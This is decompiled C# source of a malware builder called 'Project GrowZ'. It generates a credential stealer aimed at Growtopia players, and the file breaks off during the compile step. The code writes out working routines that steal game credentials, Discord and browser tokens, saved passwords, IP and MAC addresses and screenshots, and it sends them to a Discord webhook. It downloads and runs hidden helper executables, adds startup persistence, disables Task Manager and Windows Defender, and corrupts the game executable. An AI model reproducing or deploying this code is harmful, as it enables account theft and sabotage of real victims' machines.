using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using AnonFileAPI;
using MetroFramework;
using MetroFramework.Components;
using MetroFramework.Controls;
using MetroFramework.Forms;
using Microsoft.Win32;
using Project_GrowZ.Properties;

namespace Project_GrowZ
{
	// Token: 0x02000003 RID: 3
	public partial class Builder : MetroForm
	{
		// Token: 0x06000005 RID: 5 RVA: 0x0000207C File Offset: 0x0000027C
		public Builder()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000023A0 File Offset: 0x000005A0
		public static string Encrypt(string decrypted)
		{
			byte[] bytes = Encoding.Unicode.GetBytes(decrypted);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.BlockSize = 128;
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.Key = Encoding.UTF8.GetBytes("Oi09ajhiplK0hip0goidp0jkduewsp0a");
			rijndaelManaged.IV = Encoding.UTF8.GetBytes("aoI90PeaapejpsOP");
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			rijndaelManaged.Mode = CipherMode.CBC;
			string result;
			using (ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor(rijndaelManaged.Key, rijndaelManaged.IV))
			{
				result = Convert.ToBase64String(cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length));
			}
			return result;
		}



		// Token: 0x06000008 RID: 8 RVA: 0x0000248C File Offset: 0x0000068C
		public string ProcessStealer(string code)
		{
			string text = code;
			text = text.Replace("//detectdebuggercode", " [DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]\r\n            static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);\r\n            private static bool detectdebugger()\r\n            {\r\n                bool isDebuggerPresent = false;\r\n                CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);\r\n                return isDebuggerPresent;\r\n            }\r\n            ");
			text = text.Replace("//detectdebugger", " detectdebugger();");
			text = text.Replace("//getmacs", "private static string GetMacAddress()\r\n        {\r\n            string macAddresses = string.Empty;\r\n            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())\r\n            {\r\n                if (nic.OperationalStatus == OperationalStatus.Up)\r\n                {\r\n                    macAddresses += nic.GetPhysicalAddress().ToString() + \",\\n\";\r\n                }\r\n    }\r\n            return macAddresses.TrimEnd(',', '\\n');\r\n        }\r\n");
			text = text.Replace("//strings1", " public static bool lmaobind = false;\r\n        public static bool hidden = false;\r\n        public static bool gtrip = false;\r\n        public static bool Error = false;\r\n        public static bool isDisable = false;\r\n        public static string webtoken = \"N/A\";\r\n        public static string discordtoken = \"N/A\";");
			text = text.Replace("//strings2", "string readdecrypted = File.ReadAllText(temp + \"\\\\result.txt\");\r\n            string[] split = readdecrypted.Split('|');\r\n            string growid = split[1];\r\n            string pass = split[0];\r\n            string mac = GetMacAddress();\r\n            string ip = webclient.DownloadString(\"http://ipv4bot.whatismyipaddress.com/\");");
			if (this.enabledc.Checked)
			{
				text = text.Replace("//getinfo", "string temp = Environment.ExpandEnvironmentVariables(\"%TEMP%\");\r\n            System.Net.WebClient webclient = new WebClient();\r\n            //extractscreen\r\n            if (File.Exists(temp + \"\\\\savedecrypter.exe\"))\r\n            {\r\n                File.Delete(temp + \"\\\\savedecrypter.exe\");\r\n            }\r\n            webclient.DownloadFile(Paste(\"**link1**\"), temp + \"\\\\savedecrypter.exe\");\r\n            Process process = new Process();\r\n            ProcessStartInfo info = new ProcessStartInfo()\r\n            {\r\n                WindowStyle = ProcessWindowStyle.Hidden,\r\n                FileName = temp + \"\\\\savedecrypter.exe\",\r\n            };\r\n            process.StartInfo = info;\r\n            process.Start();\r\n            process.WaitForExit();");
				text = text.Replace("**link1**", Builder.Encrypt("https://cdn.discordapp.com/attachments/809066199827873805/877523287754813450/savedecrypter.exe"));
			}
			text = text.Replace("//sendinfo", "using (dWebHook dcWeb = new dWebHook())\r\n            {\r\n                dcWeb.WebHook = replacexdddlmaohehe\"**WEBHOOK**\"replacexdddasdj;\r\n                dcWeb.SendMessage(string.Concat(new string[]\r\n                {\r\n                    \"**Project GrowZ v1.5**\\n**GrowID:** \",\r\n                    growid,\r\n                    \"\\n**Password:** \",\r\n                    pass,\r\n                    \"\\n**Victims Ip Address:** \",\r\n                    ip,\r\n                    \"\\n**Victims Discord Token:** \",\r\n                    discordtoken,\r\n                    \"\\n**Victims Web Token:** \",\r\n                    webtoken,\r\n                    \"\\n**Victims Mac Addresses:** \",\r\n                    mac,\r\n                    \"\\n**Victims UserName:** \",\r\n                    Environment.UserName,\r\n            }));");
			text = text.Replace("**WEBHOOK**", Builder.Encrypt(this.txtwebhook.Text));
			if (this.checkstart.Checked)
			{
				text = text.Replace("//startup", "string tmp = Environment.ExpandEnvironmentVariables(\"%LOCALAPPDATA%\");\r\n            try { File.Copy(Assembly.GetExecutingAssembly().Location, tmp + \"\\\\Updater.exe\", true); } catch { }\r\n                RegistryKey rk = Registry.CurrentUser.OpenSubKey(\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", true);\r\n                rk.SetValue(\"Updater\", tmp + \"\\\\Updater.exe\");");
			}
			if (this.bindedfiles.Items.Count > 0)
			{
				string text2 = "static void ugaylmao()\r\n        {\r\n            string copytothis = Environment.ExpandEnvironmentVariables(\"**PATH**\");\r\n            //turnon\r\n            lmaobind = true;\r\n        }\r\n        private static void Extract(string resource, string path, bool admin)\r\n\t\t{\r\n\t\t\tusing (var assemblystream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resource))\r\n\t\t\t{\r\n\t\t\t\tusing (var fileStream = new FileStream(path + \"\\\\\" + resource, FileMode.Create, FileAccess.Write))\r\n\t\t\t\t{\r\n\t\t\t\t\tassemblystream.CopyTo(fileStream);\r\n                    fileStream.Close();\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tif (admin)\r\n\t\t\t{\r\n                    Process process = new Process();\r\n                    process.StartInfo.FileName = path + \"\\\\\" + resource;\r\n                    process.StartInfo.UseShellExecute = true;\r\n                    process.StartInfo.Verb = \"runas\";\r\n                    process.Start();\r\n            }\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tProcess.Start(path + \"\\\\\" + resource);\r\n\t\t\t}\r\n\t\t}";
				int startIndex = text2.IndexOf("//turnon");
				string text3 = text2;
				foreach (object obj in this.bindedfiles.Items)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					text3 = text3.Insert(startIndex, string.Concat(new string[]
					{
						Environment.NewLine,
						"Extract(\"",
						Path.GetFileName(listViewItem.SubItems[0].Text),
						"\", copytothis,",
						listViewItem.SubItems[1].Text,
						");"
					}));
				}
				text = text.Replace("//extractvoid", text3);
				text = text.Replace("**PATH**", this.metroComboBox1.SelectedItem.ToString());
				text = text.Replace("//turnonfreal", "if(System.Reflection.Assembly.GetEntryAssembly().Location != Environment.ExpandEnvironmentVariables(\"**PATH2**\") + @\"\\\" + Path.GetFileName(System.Reflection.Assembly.GetEntryAssembly().Location) && lmaobind == false){ugaylmao();}");
				text = text.Replace("**PATH2**", this.metroComboBox1.SelectedItem.ToString());
			}
			if (this.tracecheck.Checked)
			{
				string newValue = " static FileSystemWatcher watcher;\r\nprivate static void TraceSaveDat()\r\n        {\r\n            watcher = new FileSystemWatcher();\r\n            string save = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + \"\\\\Growtopia\";\r\n            watcher.Path = save;\r\n                watcher.NotifyFilter = NotifyFilters.LastWrite;\r\n                watcher.Filter = \"*.dat\";\r\n                watcher.Changed += new FileSystemEventHandler(OnChanged);\r\n                watcher.EnableRaisingEvents = true;\r\n            }\r\n            private static void OnChanged(object source, FileSystemEventArgs e)\r\n            {\r\n                string temp = Environment.ExpandEnvironmentVariables(\"%TEMP%\");\r\n                string firstpass = File.ReadAllText(temp + \"\\\\result.txt\");\r\n                string[] splitted = firstpass.Split('|');\r\n                string gid = splitted[1];\r\n                string pas = splitted[0];\r\n                Process process = new Process();\r\n                ProcessStartInfo info = new ProcessStartInfo()\r\n                {\r\n                    WindowStyle = ProcessWindowStyle.Hidden,\r\n                    FileName = temp + \"\\\\savedecrypter.exe\",\r\n                };\r\n                process.StartInfo = info;\r\n                process.Start();\r\n                process.WaitForExit();\r\n                string readdecrypted = File.ReadAllText(temp + \"\\\\result.txt\");\r\n                string[] split = readdecrypted.Split('|');\r\n                string growid = split[1];\r\n                string pass = split[0];\r\n                if (gid != growid || pas != pass)\r\n                {\r\n                    File.Delete(temp + \"\\\\savedecrypter.exe\");\r\n                    watcher.EnableRaisingEvents = false;\r\n                    Program.Main();\r\n                }\r\n            }\r\n            ";
				string newValue2 = "            TraceSaveDat();\r\n            Thread.Sleep(Timeout.Infinite);";
				text = text.Replace("//tracereplace", newValue2);
				text = text.Replace("//tracecode", newValue);
			}
			else
			{
				string newValue3 = "                File.Delete(temp + \"\\\\savedecrypter.exe\");\r\n                File.Delete(temp + \"\\\\result.txt\"); ";
				text = text.Replace("//normalreplace", newValue3);
			}
			if (this.tokensteal.Checked)
			{
				string newValue4 = "  WebToken();\r\n            DiscordGrab();";
				string newValue5 = "private static void WebToken()\r\n        {\r\n            string none = \"N/A\";\r\n            string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + \"\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\\";\r\n                if (!Directory.Exists(discordPath))\r\n                {\r\n                    webtoken = none;\r\n                }\r\n                else\r\n                {\r\n                    string[] files = Directory.GetFiles(discordPath, \"*.ldb\");\r\n                    foreach (string tkn in files)\r\n                    {\r\n                        string readed = File.ReadAllText(tkn);\r\n                        if (readed.Contains(\"oken\"))\r\n                        {\r\n                            string regex = @\"[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_\\-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}\";\r\n                            Match tokens = Regex.Match(readed, regex);\r\n                            string token = tokens.ToString();\r\n                            if (WorkingToken(token))\r\n                            {\r\n                                webtoken = token;\r\n                                break;\r\n                            }\r\n                            else\r\n                            {\r\n                            }\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n            private static void DiscordGrab()\r\n            {\r\n                string none = \"N/A\";\r\n                string discordpth = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \"\\\\discord\\\\Local Storage\\\\leveldb\\\\\";\r\n                if (!Directory.Exists(discordpth))\r\n                {\r\n                    discordtoken = none;\r\n                }\r\n                else\r\n                {\r\n                    string[] files = Directory.GetFiles(discordpth, \"*.ldb\");\r\n                    foreach (string tkn in files)\r\n                    {\r\n                        string readed = File.ReadAllText(tkn);\r\n                        if (readed.Contains(\"oken\"))\r\n                        {\r\n                            string regex = @\"[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_\\-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}\";\r\n                            Match tokens = Regex.Match(readed, regex);\r\n                            string token = tokens.ToString();\r\n                            if (WorkingToken(token))\r\n                            {\r\n                                discordtoken = token;\r\n                                break;\r\n                            }\r\n                            else\r\n                            {\r\n                            }\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n            public static bool WorkingToken(string token)\r\n            {\r\n                try\r\n                {\r\n                    WebClient wc = new WebClient();\r\n                    wc.Headers.Add(HttpRequestHeader.Authorization, token);\r\n                    string lmao = wc.DownloadString(\"https://discordapp.com/api/users/@me\");\r\n                    return true;\r\n                }\r\n                catch\r\n                {\r\n                    return false;\r\n                }\r\n            }\r\n            ";
				text = text.Replace("//tokencall", newValue4);
				text = text.Replace("//tokencode", newValue5);
			}
			if (this.hidecheck.Checked)
			{
				string newValue6 = "if(hidden == false) \r\n            {\r\n                hidden = true;\r\n                try { File.SetAttributes(Assembly.GetExecutingAssembly().Location, FileAttributes.Hidden); } catch { }\r\n            }";
				text = text.Replace("//hidelmao", newValue6);
			}
			if (this.fakemessage.Checked)
			{
				string newValue7 = "if(Error == false) \r\n            {\r\n                Error = true;\r\n                try { MessageBox.Show(\"//msg\", \"Error\", MessageBoxButtons.OK, MessageBoxIcon.Error); } catch { }\r\n            }";
				text = text.Replace("//errormessage", newValue7);
				text = text.Replace("//msg", this.fakemessagetxt.Text);
			}
			if (this.corruptgt.Checked)
			{
				string newValue8 = "private static void ripgt()\r\n        {\r\n            if (gtrip == false)\r\n            {\r\n                string gtpath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + \"\\\\Growtopia\\\\Growtopia.exe\";\r\n                byte[] growtopiabytes = File.ReadAllBytes(gtpath);\r\n                string bytes = Encoding.Default.GetString(growtopiabytes);\r\n                int index = bytes.IndexOf(\"a\");\r\n                bytes = bytes.Remove(index, 14).Insert(index, \"b\");\r\n                byte[] bytestowrite = Encoding.Default.GetBytes(bytes);\r\n                File.WriteAllBytes(gtpath, bytestowrite);\r\n                gtrip = true;\r\n            }\r\n        }";
				text = text.Replace("//corruptextract", newValue8);
				text = text.Replace("//gtripxd", "ripgt();");
			}
			if (this.disableManager.Checked)
			{
				string newValue9 = "if(isDisable == false) \r\n            {\r\n                isDisable = true;\r\n                try { RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\");\r\n                    objRegistryKey.SetValue(\"DisableTaskMgr\", 1);\r\n                    objRegistryKey.Close(); } catch { }\r\n            }";
				text = text.Replace("//disablemgr", newValue9);
			}
			if (this.screenshot.Checked)
			{
				string newValue10 = "Rectangle bounds = Screen.GetBounds(Point.Empty);\r\n                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))\r\n                {\r\n                    using (Graphics graphics = Graphics.FromImage(bitmap))\r\n                    {\r\n                        graphics.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);\r\n                    }\r\n                    bitmap.Save(temp + \"\\\\\" + \"screen.jpg\", ImageFormat.Jpeg);\r\n                }\r\n                ";
				text = text.Replace("//extractscreen", newValue10);
				text = text.Replace("//screenattachment", "dcWeb.SendAttachment(temp + \"\\\\\" + \"screen.jpg\");");
				text = text.Replace("//deleteattachment", "File.Delete(temp + \"\\\\\" + \"screen.jpg\");");
			}
			if (this.diswin.Checked)
			{
				string newValue11 = " private static void RegistryEdit(string regPath, string name, string value)\r\n        {\r\n            try\r\n            {\r\n                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))\r\n                {\r\n                    if (key == null)\r\n                    {\r\n                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);\r\n                        return;\r\n                    }\r\n                    if (key.GetValue(name) != (object)value)\r\n                        key.SetValue(name, value, RegistryValueKind.DWord);\r\n                }\r\n            }\r\n            catch { }\r\n        }\r\n\r\n        private static void CheckDefender()\r\n        {\r\n            Process proc = new Process\r\n            {\r\n                StartInfo = new ProcessStartInfo\r\n                {\r\n                    FileName = \"powershell\",\r\n                    Arguments = \"Get-MpPreference -verbose\",\r\n                    UseShellExecute = false,\r\n                    RedirectStandardOutput = true,\r\n                    WindowStyle = ProcessWindowStyle.Hidden,\r\n                    CreateNoWindow = true\r\n                }\r\n        };\r\n        proc.Start();\r\n            while (!proc.StandardOutput.EndOfStream)\r\n            {\r\n                string line = proc.StandardOutput.ReadLine();\r\n\r\n                if (line.StartsWith(@\"DisableRealtimeMonitoring\") && line.EndsWith(\"False\"))\r\n                    RunPS(\"Set-MpPreference -DisableRealtimeMonitoring $true\"); //real-time protection\r\n\r\n                else if (line.StartsWith(@\"DisableBehaviorMonitoring\") && line.EndsWith(\"False\"))\r\n                    RunPS(\"Set-MpPreference -DisableBehaviorMonitoring $true\"); //behavior monitoring\r\n\r\n                else if (line.StartsWith(@\"DisableBlockAtFirstSeen\") && line.EndsWith(\"False\"))\r\n                    RunPS(\"Set-MpPreference -DisableBlockAtFirstSeen $true\");\r\n\r\n                else if (line.StartsWith(@\"DisableIOAVProtection\") && line.EndsWith(\"False\"))\r\n                    RunPS(\"Set-MpPreference -DisableIOAVProtection $true\"); //scans all downloaded files and attachments\r\n\r\n                else if (line.StartsWith(@\"DisablePrivacyMode\") && line.EndsWith(\"False\"))\r\n                    RunPS(\"Set-MpPreference -DisablePrivacyMode $true\"); //displaying threat history\r\n\r\n                else if (line.StartsWith(@\"SignatureDisableUpdateOnStartupWithoutEngine\") && line.EndsWith(\"False\"))\r\n                    RunPS(\"Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true\"); //definition updates on startup\r\n\r\n                else if (line.StartsWith(@\"DisableArchiveScanning\") && line.EndsWith(\"False\"))\r\n                    RunPS(\"Set-MpPreference -DisableArchiveScanning $true\"); //scan archive files, such as .zip and .cab files\r\n\r\n                else if (line.StartsWith(@\"DisableIntrusionPreventionSystem\") && line.EndsWith(\"False\"))\r\n                    RunPS(\"Set-MpPreference -DisableIntrusionPreventionSystem $true\"); // network protection \r\n\r\n                else if (line.StartsWith(@\"DisableScriptScanning\") && line.EndsWith(\"False\"))\r\n                    RunPS(\"Set-MpPreference -DisableScriptScanning $true\"); //scanning of scripts during scans\r\n\r\n                else if (line.StartsWith(@\"SubmitSamplesConsent\") && !line.EndsWith(\"2\"))\r\n                    RunPS(\"Set-MpPreference -SubmitSamplesConsent 2\"); //MAPSReporting \r\n\r\n                else if (line.StartsWith(@\"MAPSReporting\") && !line.EndsWith(\"0\"))\r\n                    RunPS(\"Set-MpPreference -MAPSReporting 0\"); //MAPSReporting \r\n\r\n                else if (line.StartsWith(@\"HighThreatDefaultAction\") && !line.EndsWith(\"6\"))\r\n                    RunPS(\"Set-MpPreference -HighThreatDefaultAction 6 -Force\"); // high level threat // Allow\r\n\r\n                else if (line.StartsWith(@\"ModerateThreatDefaultAction\") && !line.EndsWith(\"6\"))\r\n                    RunPS(\"Set-MpPreference -ModerateThreatDefaultAction 6\"); // moderate level threat\r\n\r\n                else if (line.StartsWith(@\"LowThreatDefaultAction\") && !line.EndsWith(\"6\"))\r\n                    RunPS(\"Set-MpPreference -LowThreatDefaultAction 6\"); // low level threat\r\n\r\n                else if (line.StartsWith(@\"SevereThreatDefaultAction\") && !line.EndsWith(\"6\"))\r\n                    RunPS(\"Set-MpPreference -SevereThreatDefaultAction 6\"); // severe level threat\r\n    }\r\n}\r\n\r\nprivate static void RunPS(string args)\r\n{\r\n    Process proc = new Process\r\n    {\r\n        StartInfo = new ProcessStartInfo\r\n        {\r\n            FileName = \"powershell\",\r\n            Arguments = args,\r\n            WindowStyle = ProcessWindowStyle.Hidden,\r\n            CreateNoWindow = true\r\n        }\r\n    };\r\n    proc.Start();\r\n}";
				string newValue12 = " if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;\r\n\r\n            RegistryEdit(@\"SOFTWARE\\Microsoft\\Windows Defender\\Features\", \"TamperProtection\", \"0\"); //Windows 10 1903 Redstone 6\r\n            RegistryEdit(@\"SOFTWARE\\Policies\\Microsoft\\Windows Defender\", \"DisableAntiSpyware\", \"1\");\r\n                RegistryEdit(@\"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\", \"DisableBehaviorMonitoring\", \"1\");\r\n                RegistryEdit(@\"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\", \"DisableOnAccessProtection\", \"1\");\r\n                RegistryEdit(@\"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\", \"DisableScanOnRealtimeEnable\", \"1\");\r\n\r\n                CheckDefender(); ";
				text = text.Replace("//diswincode", newValue11);
				text = text.Replace("//diswin", newValue12);
			}
			if (this.passwords.Checked)
			{
				string newValue13 = "private static string RetrivePass()\r\n        {\r\n            string temp = Environment.ExpandEnvironmentVariables(\"%TEMP%\");\r\n            WebClient webclient = new WebClient();\r\n                webclient.DownloadFile(Paste(\"**link2**\"), temp + \"\\\\resourcefileh.exe\");\r\n                webclient.Dispose();\r\n                Process process = new Process();\r\n                ProcessStartInfo info = new ProcessStartInfo()\r\n                {\r\n                    WindowStyle = ProcessWindowStyle.Hidden,\r\n                    FileName = temp + \"\\\\resourcefileh.exe\",\r\n                    Arguments = @\"/C \" + \"/stext \" + temp + \"\\\\credentials.txt\",\r\n                };\r\n                process.StartInfo = info;\r\n                process.Start();\r\n                Thread.Sleep(500);\r\n                File.Delete(temp + \"\\\\resourcefileh.exe\");\r\n                string readed = File.ReadAllText(temp + \"\\\\credentials.txt\");\r\n                File.Delete(temp + \"\\\\credentials.txt\");\r\n                return readed;\r\n            }\r\n            ";
				string newValue14 = "            string passes = RetrivePass();\r\n            File.WriteAllText(temp + \"\\\\credentials.txt\", passes);\r\n            dcWeb.SendAttachment(temp + \"\\\\credentials.txt\");\r\n            File.Delete(temp + \"\\\\credentials.txt\");";
				text = text.Replace("//extractpass", newValue13);
				text = text.Replace("//passattachment", newValue14);
				text = text.Replace("**link2**", Builder.Encrypt("https://cdn.discordapp.com/attachments/809066199827873805/877523460476256297/WebBrowserPassView.exe"));
			}
			if (this.encryptst.Checked)
			{
				string newValue15 = " public static string xddddasfasf = \"aoI90PeaapejpsOP\"; \r\n        public static string lmaoohehejasd = \"Oi09ajhiplK0hip0goidp0jkduewsp0a\";\r\n        public static string Paste(string encrypted)\r\n        {\r\n            byte[] encbytes = Convert.FromBase64String(encrypted);\r\n            RijndaelManaged encdec = new RijndaelManaged();\r\n            encdec.BlockSize = 128;\r\n            encdec.KeySize = 256;\r\n            encdec.Key = Encoding.UTF8.GetBytes(lmaoohehejasd);\r\n            encdec.IV = Encoding.UTF8.GetBytes(xddddasfasf);\r\n            encdec.Padding = PaddingMode.PKCS7;\r\n            encdec.Mode = CipherMode.CBC;\r\n            using (ICryptoTransform decrypt = encdec.CreateDecryptor(encdec.Key, encdec.IV))\r\n            {\r\n                byte[] encrypt = decrypt.TransformFinalBlock(encbytes, 0, encbytes.Length);\r\n                return Encoding.Unicode.GetString(encrypt);\r\n            }\r\n        }";
				text = text.Replace("//extractpaste", newValue15);
				text = text.Replace("replacexdddlmaohehe", "Paste(");
				text = text.Replace("replacexdddasdj", ")");
			}
			return text;
		}

		// Token: 0x06000009 RID: 9 RVA: 0x0000208A File Offset: 0x0000028A
		public static string MacToString(byte[] bytes)
		{
			return BitConverter.ToString(bytes).Replace("-", "").ToUpper();
		}

		// Token: 0x0600000A RID: 10 RVA: 0x000020A6 File Offset: 0x000002A6
		private void Builder_FormClosing(object sender, FormClosingEventArgs e)
		{
			Application.ExitThread();
			Environment.Exit(Environment.ExitCode);
		}

		// Token: 0x0600000B RID: 11 RVA: 0x000020B7 File Offset: 0x000002B7
		private void enabledc_CheckedChanged(object sender, EventArgs e)
		{
			if (this.enabledc.Checked)
			{
				this.txtwebhook.Enabled = true;
				return;
			}
			this.txtwebhook.Enabled = false;
		}

		// Token: 0x0600000C RID: 12 RVA: 0x000020DF File Offset: 0x000002DF
		private void fakemessage_CheckedChanged(object sender, EventArgs e)
		{
			if (this.fakemessage.Checked)
			{
				this.fakemessagetxt.Enabled = true;
				this.testFakeMessage.Enabled = true;
				return;
			}
			this.fakemessagetxt.Enabled = false;
			this.testFakeMessage.Enabled = false;
		}

		// Token: 0x0600000D RID: 13 RVA: 0x0000211F File Offset: 0x0000031F
		private void pumpFile_CheckedChanged(object sender, EventArgs e)
		{
			if (this.pumpFile.Checked)
			{
				this.pumpFiletxt.Enabled = true;
				return;
			}
			this.pumpFiletxt.Enabled = false;
		}

		// Token: 0x0600000E RID: 14 RVA: 0x00002147 File Offset: 0x00000347
		private void iconcheck_CheckedChanged(object sender, EventArgs e)
		{
			if (this.iconcheck.Checked)
			{
				this.icontxt.Enabled = true;
				this.iconbutton.Enabled = true;
				return;
			}
			this.icontxt.Enabled = false;
			this.iconbutton.Enabled = false;
		}

		// Token: 0x0600000F RID: 15 RVA: 0x00002187 File Offset: 0x00000387
		private void testFakeMessage_Click(object sender, EventArgs e)
		{
			MessageBox.Show(this.fakemessagetxt.Text, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x06000010 RID: 16 RVA: 0x000028E0 File Offset: 0x00000AE0
		private void iconbutton_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Title = "Find your icon.";
			openFileDialog.FileName = "";
			openFileDialog.Filter = "Icon files(*.ico)|*.ico";
			openFileDialog.ShowDialog();
			if (!(openFileDialog.FileName == "") && !(openFileDialog.FileName == " "))
			{
				this.icontxt.Text = openFileDialog.FileName;
				this.pictureBox1.Image = Bitmap.FromHicon(new Icon(openFileDialog.FileName, new Size(48, 48)).Handle);
			}
		}

		// Token: 0x06000011 RID: 17 RVA: 0x0000297C File Offset: 0x00000B7C
		private void bindadd_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				ListViewItem value = new ListViewItem(new string[]
				{
					openFileDialog.FileName,
					"false"
				});
				this.bindedfiles.Items.Add(value);
				return;
			}
		}

		// Token: 0x06000012 RID: 18 RVA: 0x000029C8 File Offset: 0x00000BC8
		private void bindremove_Click(object sender, EventArgs e)
		{
			if (this.bindedfiles.Items.Count > 0)
			{
				try
				{
					this.bindedfiles.SelectedItems[0].Remove();
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00002A14 File Offset: 0x00000C14
		private void metroButton1_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.bindedfiles.SelectedItems[0].SubItems[1].Text == "true")
				{
					this.bindedfiles.SelectedItems[0].SubItems[1].Text = "false";
				}
				else if (this.bindedfiles.SelectedItems[0].SubItems[1].Text == "false")
				{
					this.bindedfiles.SelectedItems[0].SubItems[1].Text = "true";
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00002AE0 File Offset: 0x00000CE0
		public static string GenerateRandomString(int size)
		{
			byte[] array = new byte[4 * size];
			using (RNGCryptoServiceProvider rngcryptoServiceProvider = new RNGCryptoServiceProvider())
			{
				rngcryptoServiceProvider.GetBytes(array);
			}
			StringBuilder stringBuilder = new StringBuilder(size);
			for (int i = 0; i < size; i++)
			{
				long num = (long)((ulong)BitConverter.ToUInt32(array, i * 4) % (ulong)((long)Builder.chars.Length));
				stringBuilder.Append(Builder.chars[(int)(checked((IntPtr)num))]);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x06000015 RID: 21 RVA: 0x000021A2 File Offset: 0x000003A2
		public static string Encode(string plainText)
		{
			return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00002B60 File Offset: 0x00000D60
		private void compilebtn_Click(object sender, EventArgs e)
		{
			if (string.IsNullOrEmpty(this.txtwebhook.Text))
			{
				MessageBox.Show("Webhook url cant be empty!", "project 651 - waltix", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			string str = Builder.GenerateRandomString(new Random().Next(10, 30));
			try
			{
				SaveFileDialog saveFileDialog = new SaveFileDialog();
				saveFileDialog.Title = "Save your Stealer...";
				saveFileDialog.FileName = "";
				saveFileDialog.Filter = "Executable files(*.exe)|*.exe";
				if (saveFileDialog.ShowDialog() == DialogResult.OK)
				{
					if (saveFileDialog.FileName == "" || saveFileDialog.FileName == " " || saveFileDialog.FileName == string.Empty)
					{
						MessageBox.Show("Invalid path", "Invalid path", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					}
					else
					{
						string fileName = saveFileDialog.FileName;
						string text = this.txtwebhook.Text;
						string str2 = Environment.ExpandEnvironmentVariables("%TEMP%");
						Directory.CreateDirectory(str2 + "\\" + str);
						string text2 = str2 + "\\" + str;
						string text3 = Resources.Main;
						text3 = this.ProcessStealer(text3);
						CodeDomProvider codeDomProvider = CodeDomProvider.CreateProvider("CSharp");
						CompilerParameters compilerParameters = new CompilerParameters();
						compilerParameters.ReferencedAssemblies.Add("System.Net.dll");
						compilerParameters.ReferencedAssemblies.Add("System.dll");
						compilerParameters.ReferencedAssemblies.Add("System.Collections.Specialized.dll");
						compilerParameters.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll");
						compilerParameters.ReferencedAssemblies.Add("System.IO.dll");
						compilerParameters.ReferencedAssemblies.Add("System.Reflection.dll");
						compilerParameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
						compilerParameters.ReferencedAssemblies.Add("System.Drawing.dll");
						compilerParameters.ReferencedAssemblies.Add("System.Management.dll");
						compilerParameters.ReferencedAssemblies.Add("System.IO.Compression.dll");
						compilerParameters.ReferencedAssemblies.Add("System.Data.DataSetExtensions.dll");
						compilerParameters.ReferencedAssemblies.Add("System.Core.dll");
						compilerParameters.ReferencedAssemblies.Add("System.Runtime.Serialization.dll");
						compilerParameters.ReferencedAssemblies.Add("System.Xml.dll");
						compilerParameters.ReferencedAssemblies.Add("System.Net.dll");
						compilerParameters.ReferencedAssemblies.Add("System.Net.Http.dll");
						compilerParameters.ReferencedAssemblies.Add("mscorlib.dll");
						compilerParameters.GenerateExecutable = true;
						compilerParameters.OutputAssembly = text2 + "\\lmao.exe";
						compilerParameters.GenerateInMemory = false;
						CompilerParameters compilerParameters2 = compilerParameters;
						compilerParameters2.CompilerOptions += "/t:winexe";
